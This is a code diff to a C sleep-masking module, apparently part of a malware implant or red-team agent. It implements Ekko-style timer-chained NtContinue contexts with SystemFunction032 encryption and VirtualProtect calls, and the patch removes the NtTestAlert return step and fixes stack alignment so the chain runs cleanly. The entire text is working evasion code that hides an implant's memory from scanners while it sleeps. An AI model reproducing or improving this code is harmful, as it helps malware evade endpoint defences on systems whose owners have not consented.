@@ -133,7 +133,6 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     static SystemFunction032_t   pSystemFunction032     = NULL;
     static LPVOID                pVirtualProtect        = NULL;
     static LPVOID                pNtContinue            = NULL;
-    static LPVOID                pNtTestAlert           = NULL;
     static LPVOID                pWaitForSingleObjectEx = NULL;
     static LPVOID                pSetEvent              = NULL;
     static LPVOID                pRtlCaptureContext     = NULL;
@@ -180,13 +179,12 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
         pSystemFunction032     = (SystemFunction032_t)GetProcAddress(hAdvapi32, "SystemFunction032");
         pVirtualProtect        = (LPVOID)GetProcAddress(hKernel32, "VirtualProtect");
         pNtContinue            = (LPVOID)GetProcAddress(hNtdll, "NtContinue");
-        pNtTestAlert           = (LPVOID)GetProcAddress(hNtdll, "NtTestAlert");
         pWaitForSingleObjectEx = (LPVOID)GetProcAddress(hKernel32, "WaitForSingleObjectEx");
         pSetEvent              = (LPVOID)GetProcAddress(hKernel32, "SetEvent");
         pRtlCaptureContext     = (LPVOID)GetProcAddress(hNtdll, "RtlCaptureContext");
 
         if (!pSystemFunction032 || !pVirtualProtect || !pNtContinue ||
-            !pNtTestAlert || !pWaitForSingleObjectEx || !pSetEvent ||
+            !pWaitForSingleObjectEx || !pSetEvent ||
             !pRtlCaptureContext) {
             DLOG("SLEEPMASK: Failed to resolve function pointers for self-masking\n");
             return FALSE;
@@ -409,12 +407,15 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
 
             // [7] Build 7 NtContinue CONTEXT structs from the captured timer-thread context.
             //     Static array to avoid exceeding the 4KB stack probe threshold.
+            //     Rsp is decremented by sizeof(PVOID) so that [Rsp] aligns with
+            //     the return address the timer dispatch pushed for its `call [callback]`.
+            //     Each chain function returns naturally to the dispatch, which then
+            //     fires the next timer callback — no NtTestAlert needed.
             static CONTEXT Ctx[7];
 
             for (int i = 0; i < 7; i++) {
                 _memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
                 Ctx[i].Rsp -= sizeof(PVOID);
-                *(ULONG_PTR*)(Ctx[i].Rsp) = (ULONG_PTR)pNtTestAlert;
             }
 
             // Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, NULL) — gate
